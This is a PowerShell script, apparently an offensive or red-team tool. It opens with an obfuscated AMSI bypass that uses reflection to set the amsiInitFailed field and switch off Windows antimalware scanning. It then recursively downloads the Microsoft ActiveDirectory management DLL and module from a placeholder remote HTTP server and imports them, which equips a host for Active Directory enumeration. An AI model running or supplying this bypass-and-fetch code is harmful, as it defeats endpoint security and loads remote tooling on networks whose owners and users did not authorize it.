[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))

$dirUrl = "http://your.url.here:8080/ADModule/"
$destFolder = "where\you\want\to\save\files\to\ADModule"

if (!(Test-Path -Path $destFolder)) {
    New-Item -ItemType Directory -Path $destFolder | Out-Null
}

$content = @{}

function Download-FilesRecursively {
    param (
        [string]$url,
        [string]$targetDir
    )

    Try{
        $response = Invoke-WebRequest -Uri $url
    }Catch{}

    $links = $response.Links | WHere-Object { $_.href -notmatch "^\.\.?$" }

    foreach ($link in $links){
        $linkUrl = $url.TrimEnd("/") + "/" + $link.href
        $localFilePath = Join-Path $targetDir $link.href
        if ($link.tagName -eq "A" -and $link.href -match "/$") {
            if (!(Test-Path -Path $localFilePath)) {
                New-Item -ItemType Directory -Path $localFilePath -Force
            }
            Download-FilesRecursively -url $linkUrl -targetDir $localFilePath
        } else {
            Invoke-WebRequest -Uri $linkUrl -OutFile $localFilePath
        }
    }
}

Download-FilesRecursively -url $dirUrl -targetDir $destFolder

$madmPath = $destFolder + "\Microsoft.ActiveDirectory.Management.dll"
Import-Module $madmPath -Verbose

$adadPath = $destFolder + "\ActiveDirectory\ActiveDirectory.psd1"
Import-Module $adadPath -Verbose

function prompt{
    $currPath = Get-Location
    "ADModule $currPath> "
}